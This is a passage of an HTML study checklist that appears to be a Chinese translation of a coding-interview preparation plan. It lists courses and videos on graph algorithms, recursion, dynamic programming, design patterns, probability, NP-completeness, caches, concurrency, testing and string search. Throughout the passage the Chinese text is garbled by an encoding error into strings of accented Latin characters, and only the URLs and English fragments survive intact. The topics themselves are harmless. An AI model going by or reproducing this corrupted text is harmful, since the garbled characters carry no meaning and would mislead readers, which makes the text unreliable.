DFS é‚»æ¥çŸ©é˜µ (é€’å½’)</li><li>[ ] DFS é‚»æ¥çŸ©é˜µ (æ ˆè¿­ä»£)</li><li>[ ] BFS é‚»æ¥è¡¨</li><li>[ ] BFS é‚»æ¥çŸ©é˜µ</li><li>[ ] å•æºæœ€çŸ­è·¯å¾„é—®é¢˜ (Dijkstra)</li><li>[ ] æœ€å°ç”Ÿæˆæ ‘</li><li>åŸºäº DFS çš„ç®—æ³• (æ ¹æ®ä¸Šæ–‡ Aduni çš„è§†é¢‘):<ul><li>[ ] æ£€æŸ¥ç¯ (æˆ‘ä»¬ä¼šå…ˆæ£€æŸ¥æ˜¯å¦æœ‰ç¯å­˜åœ¨ä»¥ä¾¿åšæ‹“æ‰‘æ’åº)</li><li>[ ] æ‹“æ‰‘æ’åº</li><li>[ ] è®¡ç®—å›¾ä¸­çš„è¿é€šåˆ†æ”¯</li><li>[ ] åˆ—å‡ºå¼ºè¿é€šåˆ†é‡</li><li>[ ] æ£€æŸ¥åŒå‘å›¾</li></ul></li></ul></li></ul><p>å¯ä»¥ä» Skiena çš„ä¹¦ï¼ˆå‚è€ƒä¸‹é¢çš„ä¹¦æ¨èå°èŠ‚ï¼‰å’Œé¢è¯•ä¹¦ç±ä¸­å­¦ä¹ æ›´å¤šå…³äºå›¾çš„å®è·µã€‚</p><h2><span id="geng-duo-zhi-shi">æ›´å¤šçŸ¥è¯†</span></h2><ul><li><h3><span id="di-gui-recursion">é€’å½’ï¼ˆRecursionï¼‰</span></h3><ul><li>[ ] Stanford å¤§å­¦å…³äºé€’å½’ &amp; å›æº¯çš„è¯¾ç¨‹:<ul><li>[ ] <a href="https://www.youtube.com/watch?v=gl3emqCuueQ&amp;list=PLFE6E58F856038C69&amp;index=8">è¯¾ç¨‹ 8 | æŠ½è±¡ç¼–ç¨‹ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=uFJhEPrbycQ&amp;list=PLFE6E58F856038C69&amp;index=9">è¯¾ç¨‹ 9 | æŠ½è±¡ç¼–ç¨‹ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=NdF1QDTRkck&amp;index=10&amp;list=PLFE6E58F856038C69">è¯¾ç¨‹ 10 | æŠ½è±¡ç¼–ç¨‹ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=p-gpaIGRCQI&amp;list=PLFE6E58F856038C69&amp;index=11">è¯¾ç¨‹ 11 | æŠ½è±¡ç¼–ç¨‹ï¼ˆè§†é¢‘ï¼‰</a></li></ul></li><li>ä»€ä¹ˆæ—¶å€™é€‚åˆä½¿ç”¨</li><li>å°¾é€’å½’ä¼šæ›´å¥½ä¹ˆ?<ul><li>[ ] <a href="https://www.quora.com/What-is-tail-recursion-Why-is-it-so-bad">ä»€ä¹ˆæ˜¯å°¾é€’å½’ä»¥åŠä¸ºä»€ä¹ˆå®ƒå¦‚æ­¤ç³Ÿç³•?</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=L1jjXGfxozc">å°¾é€’å½’ï¼ˆè§†é¢‘ï¼‰</a></li></ul></li></ul></li><li><h3><span id="dong-tai-gui-hua-dynamic-programming">åŠ¨æ€è§„åˆ’ï¼ˆDynamic Programmingï¼‰</span></h3><ul><li>åœ¨ä½ çš„é¢è¯•ä¸­æˆ–è®¸æ²¡æœ‰ä»»ä½•åŠ¨æ€è§„åˆ’çš„é—®é¢˜ï¼Œä½†èƒ½å¤ŸçŸ¥é“ä¸€ä¸ªé¢˜ç›®å¯ä»¥ä½¿ç”¨åŠ¨æ€è§„åˆ’æ¥è§£å†³æ˜¯å¾ˆé‡è¦çš„ã€‚</li><li>è¿™ä¸€éƒ¨åˆ†ä¼šæœ‰ç‚¹å›°éš¾ï¼Œæ¯ä¸ªå¯ä»¥ç”¨åŠ¨æ€è§„åˆ’è§£å†³çš„é—®é¢˜éƒ½å¿…é¡»å…ˆå®šä¹‰å‡ºé€’æ¨å…³ç³»ï¼Œè¦æ¨å¯¼å‡ºæ¥å¯èƒ½ä¼šæœ‰ç‚¹æ£˜æ‰‹ã€‚</li><li>æˆ‘å»ºè®®å…ˆé˜…è¯»å’Œå­¦ä¹ è¶³å¤Ÿå¤šçš„åŠ¨æ€è§„åˆ’çš„ä¾‹å­ï¼Œä»¥ä¾¿å¯¹è§£å†³ DP é—®é¢˜çš„ä¸€èˆ¬æ¨¡å¼æœ‰ä¸ªæ‰å®çš„ç†è§£ã€‚</li><li>[ ] è§†é¢‘:<ul><li>Skiena çš„è§†é¢‘å¯èƒ½ä¼šæœ‰ç‚¹éš¾è·Ÿä¸Šï¼Œæœ‰æ—¶å€™ä»–ç”¨ç™½æ¿å†™çš„å­—ä¼šæ¯”è¾ƒå°ï¼Œéš¾çœ‹æ¸…æ¥šã€‚</li><li>[ ] <a href="https://youtu.be/Qc2ieXRgR0k?list=PLOtl7M3yp-DV69F32zdK7YJcNXpTunF2b&amp;t=1718">Skiena: CSE373 2012 - è¯¾ç¨‹ 19 - åŠ¨æ€è§„åˆ’ä»‹ç»ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://youtu.be/IsmMhMdyeGY?list=PLOtl7M3yp-DV69F32zdK7YJcNXpTunF2b&amp;t=2749">Skiena: CSE373 2012 - è¯¾ç¨‹ 20 - ç¼–è¾‘è·ç¦»ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://youtu.be/o0V9eYF4UI8?list=PLOtl7M3yp-DV69F32zdK7YJcNXpTunF2b&amp;t=406">Skiena: CSE373 2012 - è¯¾ç¨‹ 21 - åŠ¨æ€è§„åˆ’ä¸¾ä¾‹ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=dRbMC1Ltl3A&amp;list=PLOtl7M3yp-DV69F32zdK7YJcNXpTunF2b&amp;index=22">Skiena: CSE373 2012 - è¯¾ç¨‹ 22 - åŠ¨æ€è§„åˆ’åº”ç”¨ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://youtu.be/J5aJEcOr6Eo?list=PLFDnELG9dpVxQCxuD-9BSy2E7BWY3t5Sm&amp;t=3558">Simonson: åŠ¨æ€è§„åˆ’ 0 (starts at 59:18)ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=0EzHjQ_SOeU&amp;index=11&amp;list=PLFDnELG9dpVxQCxuD-9BSy2E7BWY3t5Sm">Simonson: åŠ¨æ€è§„åˆ’ I - è¯¾ç¨‹ 11ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=v1qiRwuJU7g&amp;list=PLFDnELG9dpVxQCxuD-9BSy2E7BWY3t5Sm&amp;index=12">Simonson: åŠ¨æ€è§„åˆ’ II - è¯¾ç¨‹ 12ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] å•ç‹¬çš„ DP é—®é¢˜ (æ¯ä¸€ä¸ªè§†é¢‘éƒ½å¾ˆçŸ­)ï¼š<a href="https://www.youtube.com/playlist?list=PLrmLmBdmIlpsHaNTPP_jHHDx_os9ItYXr">åŠ¨æ€è§„åˆ’ï¼ˆè§†é¢‘ï¼‰</a></li></ul></li><li>[ ] è€¶é²è¯¾ç¨‹ç¬”è®°:<ul><li>[ ] <a href="http://www.cs.yale.edu/homes/aspnes/classes/223/notes.html#dynamicProgramming">åŠ¨æ€è§„åˆ’</a></li></ul></li><li>[ ] Coursera è¯¾ç¨‹:<ul><li>[ ] <a href="https://www.coursera.org/learn/algorithmic-thinking-2/lecture/80RrW/the-rna-secondary-structure-problem">RNA äºŒçº§ç»“æ„é—®é¢˜ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.coursera.org/learn/algorithmic-thinking-2/lecture/PSonq/a-dynamic-programming-algorithm">åŠ¨æ€è§„åˆ’ç®—æ³•ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.coursera.org/learn/algorithmic-thinking-2/lecture/oUEK2/illustrating-the-dp-algorithm">DP ç®—æ³•æè¿°ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.coursera.org/learn/algorithmic-thinking-2/lecture/nfK2r/running-time-of-the-dp-algorithm">DP ç®—æ³•çš„è¿è¡Œæ—¶é—´ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.coursera.org/learn/algorithmic-thinking-2/lecture/M999a/dp-vs-recursive-implementation">DP vs é€’å½’å®ç°ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.coursera.org/learn/algorithmic-thinking-2/lecture/UZ7o6/global-pairwise-sequence-alignment">å…¨å±€æˆå¯¹åºåˆ—æ’åˆ—ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.coursera.org/learn/algorithmic-thinking-2/lecture/WnNau/local-pairwise-sequence-alignment">æœ¬åœ°æˆå¯¹åºåˆ—æ’åˆ—ï¼ˆè§†é¢‘ï¼‰</a></li></ul></li></ul></li><li><h3><span id="mian-xiang-dui-xiang-bian-cheng">é¢å‘å¯¹è±¡ç¼–ç¨‹</span></h3><ul><li>å¯é€‰ï¼š<a href="https://www.youtube.com/watch?v=OkC7HKtiZC0&amp;list=PLGLfVvz_LVvQ5G-LdJ8RLqe-ndo7QITYc">UML 2.0ç³»åˆ—ï¼ˆè§†é¢‘ï¼‰</a></li><li>SOLID é¢å‘å¯¹è±¡ç¼–ç¨‹åŸåˆ™ï¼š<a href="https://www.youtube.com/playlist?list=PL4CE9F710017EA77A">SOLID åŸåˆ™ï¼ˆè§†é¢‘ï¼‰</a></li></ul></li><li><h3><span id="she-ji-mo-shi">è®¾è®¡æ¨¡å¼</span></h3><ul><li>[ ] <a href="https://www.youtube.com/watch?v=3cmzqZzwNDM&amp;list=PLGLfVvz_LVvQ5G-LdJ8RLqe-ndo7QITYc&amp;index=3">UML ç»Ÿä¸€å»ºæ¨¡è¯­è¨€æ¦‚è§ˆ (è§†é¢‘)</a></li><li>[ ] ä¸»è¦æœ‰å¦‚ä¸‹çš„è®¾è®¡æ¨¡å¼:<ul><li>[ ] ç­–ç•¥æ¨¡å¼ï¼ˆstrategyï¼‰</li><li>[ ] å•ä¾‹æ¨¡å¼ï¼ˆsingletonï¼‰</li><li>[ ] é€‚é…å™¨æ¨¡å¼ï¼ˆadapterï¼‰</li><li>[ ] åŸå‹æ¨¡å¼ï¼ˆprototypeï¼‰</li><li>[ ] è£…é¥°å™¨æ¨¡å¼ï¼ˆdecoratorï¼‰</li><li>[ ] è®¿é—®è€…æ¨¡å¼ï¼ˆvisitorï¼‰</li><li>[ ] å·¥å‚æ¨¡å¼ï¼ŒæŠ½è±¡å·¥å‚æ¨¡å¼ï¼ˆfactory, abstract factoryï¼‰</li><li>[ ] å¤–è§‚æ¨¡å¼ï¼ˆfacadeï¼‰</li><li>[ ] è§‚å¯Ÿè€…æ¨¡å¼ï¼ˆobserverï¼‰</li><li>[ ] ä»£ç†æ¨¡å¼ï¼ˆproxyï¼‰</li><li>[ ] å§”æ‰˜æ¨¡å¼ï¼ˆdelegateï¼‰</li><li>[ ] å‘½ä»¤æ¨¡å¼ï¼ˆcommandï¼‰</li><li>[ ] çŠ¶æ€æ¨¡å¼ï¼ˆstateï¼‰</li><li>[ ] å¤‡å¿˜å½•æ¨¡å¼ï¼ˆmementoï¼‰</li><li>[ ] è¿­ä»£å™¨æ¨¡å¼ï¼ˆiteratorï¼‰</li><li>[ ] ç»„åˆæ¨¡å¼ï¼ˆcompositeï¼‰</li><li>[ ] äº«å…ƒæ¨¡å¼ï¼ˆflyweightï¼‰</li></ul></li><li>[ ] <a href="https://youtu.be/LAP2A80Ajrg?list=PLJ9pm_Rc9HesnkwKlal_buSIHA-jTZMpO&amp;t=3344">ç¬¬å…­ç«  (ç¬¬ 1 éƒ¨åˆ† ) - è®¾è®¡æ¨¡å¼ (è§†é¢‘)</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=U8-PGsjvZc4&amp;index=12&amp;list=PLJ9pm_Rc9HesnkwKlal_buSIHA-jTZMpO">ç¬¬å…­ç«  (ç¬¬ 2 éƒ¨åˆ† ) - Abstraction-Occurrence, General Hierarchy, Player-Role, Singleton, Observer, Delegation (è§†é¢‘)</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=7sduBHuex4c&amp;index=13&amp;list=PLJ9pm_Rc9HesnkwKlal_buSIHA-jTZMpO">ç¬¬å…­ç«  (ç¬¬ 3 éƒ¨åˆ† ) - Adapter, Facade, Immutable, Read-Only Interface, Proxyï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.youtube.com/playlist?list=PLF206E906175C7E07">ç³»åˆ—è§†é¢‘ï¼ˆ27ä¸ªï¼‰</a></li><li>[ ] <a href="https://www.amazon.com/Head-First-Design-Patterns-Freeman/dp/0596007124">Head First è®¾è®¡æ¨¡å‹</a><ul><li>å°½ç®¡ã€Šè®¾è®¡æ¨¡å¼ï¼šå¯å¤ç”¨é¢å‘å¯¹è±¡è½¯ä»¶çš„åŸºç¡€ã€‹æ‰æ˜¯è¿™æ–¹é¢çš„ç»å…¸ï¼Œä½†æ˜¯æˆ‘è¿˜æ˜¯è®¤ä¸ºHead Firstå¯¹äºæ–°æ‰‹æ›´åŠ å‹å¥½ã€‚</li></ul></li><li>[ ] <a href="https://sourcemaking.com/design-patterns-and-tips">å®é™…æ“ä½œï¼šè®¾è®¡æ¨¡å¼å’Œå¯¹å…¥é—¨å¼€å‘è€…çš„å»ºè®®</a></li><li>[ ] <a href="https://github.com/kamranahmedse/design-patterns-for-humans#structural-design-patterns">Design patterns for humans</a></li></ul></li><li><h3><span id="zu-he-combinatorics-n-zhong-xuan-k-ge-amp-gai-lu-probability">ç»„åˆï¼ˆCombinatoricsï¼‰ (n ä¸­é€‰ k ä¸ª) &amp; æ¦‚ç‡ï¼ˆProbabilityï¼‰</span></h3><ul><li>[ ] <a href="https://www.youtube.com/watch?v=8RRo6Ti9d0U">æ•°æ®æŠ€å·§: å¦‚ä½•æ‰¾å‡ºé˜¶ä¹˜ã€æ’åˆ—å’Œç»„åˆ(é€‰æ‹©)ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=sZkAAk9Wwa4">æ¥ç‚¹å­¦æ ¡çš„ä¸œè¥¿: æ¦‚ç‡ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=dNaJg-mLobQ">æ¥ç‚¹å­¦æ ¡çš„ä¸œè¥¿: æ¦‚ç‡å’Œé©¬å°”å¯å¤«é“¾ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] å¯æ±—å­¦é™¢:<ul><li>è¯¾ç¨‹è®¾ç½®:<ul><li>[ ] <a href="https://www.khanacademy.org/math/probability/probability-and-combinatorics-topic">æ¦‚ç‡ç†è®ºåŸºç¡€</a></li></ul></li><li>åªæœ‰è§†é¢‘ - 41 (æ¯ä¸€ä¸ªéƒ½çŸ­å°ç²¾æ‚):<ul><li>[ ] <a href="https://www.youtube.com/watch?v=uzkc-qNVoOk&amp;list=PLC58778F28211FA19">æ¦‚ç‡è§£é‡Šï¼ˆè§†é¢‘ï¼‰</a></li></ul></li></ul></li></ul></li><li><h3><span id="np-np-wan-quan-he-jin-si-suan-fa">NP, NP-å®Œå…¨å’Œè¿‘ä¼¼ç®—æ³•</span></h3><ul><li>çŸ¥é“æœ€ç»å…¸çš„ä¸€äº› NP å®Œå…¨é—®é¢˜ï¼Œæ¯”å¦‚æ—…è¡Œå•†é—®é¢˜å’ŒèƒŒåŒ…é—®é¢˜ï¼Œè€Œä¸”èƒ½åœ¨é¢è¯•å®˜è¯•å›¾å¿½æ‚ ä½ çš„æ—¶å€™è¯†åˆ«å‡ºä»–ä»¬ã€‚</li><li>çŸ¥é“ NP å®Œå…¨æ˜¯ä»€ä¹ˆæ„æ€.</li><li>[ ] <a href="https://www.youtube.com/watch?v=moPtwq_cVH8&amp;list=PLUl4u3cNGP61Oq3tWYp6V_F-5jb5L2iHb&amp;index=23">è®¡ç®—å¤æ‚åº¦ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] Simonson:<ul><li>[ ] <a href="https://youtu.be/qcGnJ47Smlo?list=PLFDnELG9dpVxQCxuD-9BSy2E7BWY3t5Sm&amp;t=2939">è´ªå¿ƒç®—æ³•. II &amp; ä»‹ç» NP-å®Œå…¨æ€§ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=e0tGC6ZQdQE&amp;index=16&amp;list=PLFDnELG9dpVxQCxuD-9BSy2E7BWY3t5Sm">NP-å®Œå…¨æ€§ II &amp; å½’çº¦ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=fCX1BGT3wjE&amp;index=17&amp;list=PLFDnELG9dpVxQCxuD-9BSy2E7BWY3t5Sm">NP-å®Œå…¨æ€§ IIIï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=NKLDp3Rch3M&amp;list=PLFDnELG9dpVxQCxuD-9BSy2E7BWY3t5Sm&amp;index=18">NP-å®Œå…¨æ€§ IVï¼ˆè§†é¢‘ï¼‰</a></li></ul></li><li>[ ] Skiena:<ul><li>[ ] <a href="https://youtu.be/KiK5TVgXbFg?list=PLOtl7M3yp-DV69F32zdK7YJcNXpTunF2b&amp;t=1508">CSE373 2012 - è¯¾ç¨‹ 23 - ä»‹ç» NP-å®Œå…¨æ€§ IVï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=27Al52X3hd4&amp;index=24&amp;list=PLOtl7M3yp-DV69F32zdK7YJcNXpTunF2b">CSE373 2012 - è¯¾ç¨‹ 24 - NP-å®Œå…¨æ€§è¯æ˜ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=xCPH4gwIIXM&amp;index=25&amp;list=PLOtl7M3yp-DV69F32zdK7YJcNXpTunF2b">CSE373 2012 - è¯¾ç¨‹ 25 - NP-å®Œå…¨æ€§æŒ‘æˆ˜ï¼ˆè§†é¢‘ï¼‰</a></li></ul></li><li>[ ] <a href="https://www.youtube.com/watch?v=eHZifpgyH_4&amp;list=PLUl4u3cNGP6317WaSNfmCvGym2ucw3oGp&amp;index=22">å¤æ‚åº¦: P, NP, NP-å®Œå…¨æ€§, è§„çº¦ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=MEz1J9wY2iM&amp;list=PLUl4u3cNGP6317WaSNfmCvGym2ucw3oGp&amp;index=24">å¤æ‚åº¦: è¿‘è§†ç®—æ³• Algorithmsï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=4q-jmGrmxKs&amp;index=25&amp;list=PLUl4u3cNGP6317WaSNfmCvGym2ucw3oGp">å¤æ‚åº¦: å›ºå®šå‚æ•°ç®—æ³•ï¼ˆè§†é¢‘ï¼‰</a></li><li>Peter Norvik è®¨è®ºæ—…è¡Œå•†é—®é¢˜çš„è¿‘ä¼¼æœ€ä¼˜è§£:<ul><li><a href="http://nbviewer.jupyter.org/url/norvig.com/ipython/TSP.ipynb">Jupyter ç¬”è®°æœ¬</a></li></ul></li><li>ã€Šç®—æ³•å¯¼è®ºã€‹ï¼ˆCLRSï¼‰çš„ç¬¬ 1048 - 1140 é¡µã€‚</li></ul></li><li><h3><span id="huan-cun-cache">ç¼“å­˜ï¼ˆCacheï¼‰</span></h3><ul><li>[ ] LRU ç¼“å­˜:<ul><li>[ ] <a href="https://www.youtube.com/watch?v=R5ON3iwx78M">LRU çš„é­”åŠ› (100 Days of Google Dev)ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=bq6N7Ym81iI">å®ç° LRUï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=8-FZRAjR7qU">LeetCode - 146 LRU Cache (C++)ï¼ˆè§†é¢‘ï¼‰</a></li></ul></li><li>[ ] CPU ç¼“å­˜:<ul><li>[ ] <a href="https://www.youtube.com/watch?v=vjYF_fAZI5E&amp;list=PLrRW1w6CGAcXbMtDFj205vALOGmiRc82-&amp;index=24">MIT 6.004 L15: å­˜å‚¨ä½“ç³»ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=ajgC3-pyGlk&amp;index=25&amp;list=PLrRW1w6CGAcXbMtDFj205vALOGmiRc82-">MIT 6.004 L16: ç¼“å­˜çš„é—®é¢˜ï¼ˆè§†é¢‘ï¼‰</a></li></ul></li></ul></li><li><h3><span id="jin-cheng-processe-he-xian-cheng-thread">è¿›ç¨‹ï¼ˆProcesseï¼‰å’Œçº¿ç¨‹ï¼ˆThreadï¼‰</span></h3><ul><li>[ ] è®¡ç®—æœºç§‘å­¦ 162 - æ“ä½œç³»ç»Ÿ (25 ä¸ªè§†é¢‘):<ul><li>è§†é¢‘ 1-11 æ˜¯å…³äºè¿›ç¨‹å’Œçº¿ç¨‹</li><li><a href="https://archive.org/details/ucberkeley-webcast-PL-XXv-cvA_iBDyz-ba4yDskqMDY6A1w_c">æ“ä½œç³»ç»Ÿå’Œç³»ç»Ÿç¼–ç¨‹ï¼ˆè§†é¢‘ï¼‰</a></li></ul></li><li><a href="https://www.quora.com/What-is-the-difference-between-a-process-and-a-thread">è¿›ç¨‹å’Œçº¿ç¨‹çš„åŒºåˆ«æ˜¯ä»€ä¹ˆ?</a></li><li>æ¶µç›–äº†:<ul><li>è¿›ç¨‹ã€çº¿ç¨‹ã€åç¨‹<ul><li>è¿›ç¨‹å’Œçº¿ç¨‹çš„åŒºåˆ«</li><li>è¿›ç¨‹</li><li>çº¿ç¨‹</li><li>é”</li><li>äº’æ–¥</li><li>ä¿¡å·é‡</li><li>ç›‘æ§</li><li>ä»–ä»¬æ˜¯å¦‚ä½•å·¥ä½œçš„</li><li>æ­»é”</li><li>æ´»é”</li></ul></li><li>CPU æ´»åŠ¨, ä¸­æ–­, ä¸Šä¸‹æ–‡åˆ‡æ¢</li><li>ç°ä»£å¤šæ ¸å¤„ç†å™¨çš„å¹¶å‘å¼ç»“æ„</li><li><a href="https://www.youtube.com/watch?v=LKe7xK0bF7o&amp;list=PLCiOXwirraUCBE9i_ukL8_Kfg6XNv7Se8&amp;index=2">åˆ†é¡µï¼ˆpagingï¼‰ï¼Œåˆ†æ®µï¼ˆsegmentationï¼‰å’Œè™šæ‹Ÿå†…å­˜ï¼ˆè§†é¢‘ï¼‰</a></li><li><a href="https://www.youtube.com/watch?v=uFKi2-J-6II&amp;list=PLCiOXwirraUCBE9i_ukL8_Kfg6XNv7Se8&amp;index=3">ä¸­æ–­ï¼ˆè§†é¢‘ï¼‰</a></li><li>è¿›ç¨‹èµ„æºéœ€è¦ï¼ˆå†…å­˜ï¼šä»£ç ã€é™æ€å­˜å‚¨å™¨ã€æ ˆã€å †ã€æ–‡ä»¶æè¿°ç¬¦ã€I/Oï¼‰</li><li>çº¿ç¨‹èµ„æºéœ€è¦ï¼ˆåœ¨åŒä¸€ä¸ªè¿›ç¨‹å†…å’Œå…¶ä»–çº¿ç¨‹å…±äº«ä»¥ä¸Šï¼ˆé™¤äº†æ ˆï¼‰çš„èµ„æºï¼Œä½†æ˜¯æ¯ä¸ªçº¿ç¨‹éƒ½æœ‰ç‹¬ç«‹çš„ç¨‹åºè®¡æ•°å™¨ã€æ ˆè®¡æ•°å™¨ã€å¯„å­˜å™¨å’Œæ ˆï¼‰</li><li>Fork æ“ä½œæ˜¯çœŸæ­£çš„å†™æ—¶å¤åˆ¶ï¼ˆåªè¯»ï¼‰ï¼Œç›´åˆ°æ–°çš„è¿›ç¨‹å†™åˆ°å†…å­˜ä¸­ï¼Œæ‰ä¼šç”Ÿæˆä¸€ä»½æ–°çš„æ‹·è´ã€‚</li><li>ä¸Šä¸‹æ–‡åˆ‡æ¢<ul><li>æ“ä½œç³»ç»Ÿå’Œåº•å±‚ç¡¬ä»¶æ˜¯å¦‚ä½•åˆå§‹åŒ–ä¸Šä¸‹æ–‡åˆ‡æ¢çš„ï¼Ÿ</li></ul></li></ul></li><li>[ ] <a href="https://www.youtube.com/playlist?list=PL5jc9xFGsL8E12so1wlMS0r0hTQoJL74M">C++ çš„çº¿ç¨‹ (ç³»åˆ— - 10 ä¸ªè§†é¢‘)</a></li><li>[ ] Python çš„å¹¶å‘ (è§†é¢‘):<ul><li>[ ] <a href="https://www.youtube.com/playlist?list=PL1H1sBF1VAKVMONJWJkmUh6_p8g4F2oy1">çº¿ç¨‹ç³»åˆ—</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=Bs7vPNbB9JM">Python çº¿ç¨‹</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=Obt-vMVdM8s">ç†è§£ Python çš„ GIL (2010)</a><ul><li><a href="http://www.dabeaz.com/GIL">å‚è€ƒ</a></li></ul></li><li>[ ] <a href="https://www.youtube.com/watch?v=MCs5OvhV9S4">David Beazley - Python åç¨‹ - PyCon 2015</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=ZzfHjytDceU">Keynote David Beazley - å…´è¶£ä¸»é¢˜ (Python å¼‚æ­¥ I/O)</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=0zaPs8OtyKY">Python ä¸­çš„äº’æ–¥</a></li></ul></li></ul></li><li><h3><span id="ce-shi">æµ‹è¯•</span></h3><ul><li>æ¶µç›–äº†:<ul><li>å•å…ƒæµ‹è¯•æ˜¯å¦‚ä½•å·¥ä½œçš„</li><li>ä»€ä¹ˆæ˜¯æ¨¡æ‹Ÿå¯¹è±¡</li><li>ä»€ä¹ˆæ˜¯é›†æˆæµ‹è¯•</li><li>ä»€ä¹ˆæ˜¯ä¾èµ–æ³¨å…¥</li></ul></li><li>[ ] <a href="https://www.youtube.com/watch?v=SAhJf36_u5U">James Bach è®²æ•æ·è½¯ä»¶æµ‹è¯•ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=ILkT_HV9DVU">James Bach è½¯ä»¶æµ‹è¯•å…¬å¼€è¯¾ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://vimeo.com/83960706">Steve Freeman - æµ‹è¯•é©±åŠ¨çš„å¼€å‘ï¼ˆè§†é¢‘ï¼‰</a><ul><li><a href="http://gotocon.com/dl/goto-berlin-2013/slides/SteveFreeman_TestDrivenDevelopmentThatsNotWhatWeMeant.pdf">slides</a></li></ul></li><li>[ ] <a href="http://www.obeythetestinggoat.com/pages/book.html#toc">Pythonï¼šæµ‹è¯•é©±åŠ¨çš„ Web å¼€å‘</a></li><li>[ ] ä¾èµ–æ³¨å…¥:<ul><li>[ ] <a href="https://www.youtube.com/watch?v=IKD2-MAkXyQ">è§†é¢‘</a></li><li>[ ] <a href="http://jasonpolites.github.io/tao-of-testing/ch3-1.1.html">æµ‹è¯•ä¹‹é“</a></li></ul></li><li>[ ] <a href="http://jasonpolites.github.io/tao-of-testing/ch4-1.1.html">å¦‚ä½•ç¼–å†™æµ‹è¯•</a></li></ul></li><li><h3><span id="diao-du">è°ƒåº¦</span></h3><ul><li>åœ¨æ“ä½œç³»ç»Ÿä¸­æ˜¯å¦‚ä½•è¿ä½œçš„</li><li>åœ¨æ“ä½œç³»ç»Ÿéƒ¨åˆ†çš„è§†é¢‘é‡Œæœ‰å¾ˆå¤šèµ„æ–™</li></ul></li><li><h3><span id="zi-fu-chuan-sou-suo-he-cao-zuo">å­—ç¬¦ä¸²æœç´¢å’Œæ“ä½œ</span></h3><ul><li>[ ] <a href="https://www.coursera.org/learn/algorithms-part2/lecture/TH18W/suffix-arrays">Sedgewickâ”€â”€åç¼€æ•°ç»„ï¼ˆSuffix Arraysï¼‰ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.coursera.org/learn/algorithms-part2/home/week/4">Sedgewickâ”€â”€å­å­—ç¬¦ä¸²æœå¯»ï¼ˆè§†é¢‘ï¼‰</a><ul><li>[ ] <a href="https://www.coursera.org/learn/algorithms-part2/lecture/n3ZpG/introduction-to-substring-search">1. å­å­—ç¬¦ä¸²æœå¯»å¯¼è®º</a></li><li>[ ] <a href="https://www.coursera.org/learn/algorithms-part2/lecture/2Kn5i/brute-force-substring-search">2. å­å­—ç¬¦ä¸²æœå¯»â”€â”€æš´åŠ›æ³•</a></li><li>[ ] <a href="https://www.coursera.org/learn/algorithms-part2/lecture/TAtDr/knuth-morris-pratt">3. KMPç®—æ³•</a></li><li>[ ] <a href="https://www.coursera.org/learn/algorithms-part2/lecture/CYxOT/boyer-moore">4. Boyer-Mooreç®—æ³•</a></li><li>[ ] <a href="https://www.coursera.org/learn/algorithms-part2/lecture/3KiqT/rabin-karp">5. Rabin-Karpç®—æ³•</a></li></ul></li><li>[ ] <a href="https://www.coursera.org/learn/data-structures/lecture/tAfHI/search-pattern-in-text">æ–‡æœ¬çš„æœç´¢æ¨¡å¼ï¼ˆè§†é¢‘ï¼‰</a></li></ul></li></ul><p>å¦‚æœä½ éœ€è¦æœ‰å…³æ­¤ä¸»é¢˜çš„æ›´å¤šè¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚é˜…â€œ<a 